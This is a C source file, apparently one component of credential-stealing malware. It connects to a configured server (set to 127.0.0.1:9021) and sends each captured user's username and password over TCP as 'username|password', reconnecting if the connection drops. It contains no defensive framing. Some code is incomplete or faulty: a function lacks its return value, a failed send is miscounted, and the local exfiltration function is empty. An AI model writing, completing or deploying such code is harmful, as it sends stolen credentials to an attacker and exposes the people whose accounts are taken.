#include "exfil.h"

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

struct serv_info server = {"127.0.0.1", 9021};

int server_connect() {
    struct sockaddr_in address = {0};
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);

    address.sin_family = AF_INET;
    address.sin_port = htons(server.port);

    int result = inet_pton(AF_INET, server.host, &address.sin_addr);
    if (result == -1) {
        perror("inet_pton");
        close(server_sock);
        return EXIT_FAILURE;
    }
    if (result == 0) {
        // Log invalid IP address error somewhere. Unsure how to recover
    }

    result = connect(server_sock, (struct sockaddr *) &address, sizeof address);
    if (result == -1) {
        if (errno == ETIMEDOUT) {
            // Server down, nonexistent, or firewall blocking packets
        } else if (errno == ENETUNREACH) {
            // Internet connection likely down
        }
    }

    return server_sock;
}

int remote_exfil(int socket_fd, const struct user *user) {
    char data[200];
    snprintf(data, 199, "%s|%s\n", user->username, user->password);
    size_t data_len = strlen(data);

    ssize_t bytes_sent = 0;
    while (bytes_sent < data_len) {
        ssize_t n = send(socket_fd, data + bytes_sent, data_len - bytes_sent, MSG_NOSIGNAL);
        if (n == -1) {
            if (errno == EINTR) {
                // perror("send");
                // printf("send() interrupted. Attempting to send again...\n");
                continue;
            }
            if (errno == EPIPE || errno == ECONNRESET) {
                // Connection was lost. Attempt to reconnect
                close(socket_fd);
                socket_fd = server_connect();
                continue;
            }
        }
        bytes_sent += n;
    }
}
int local_exfil(struct user *user) {

}
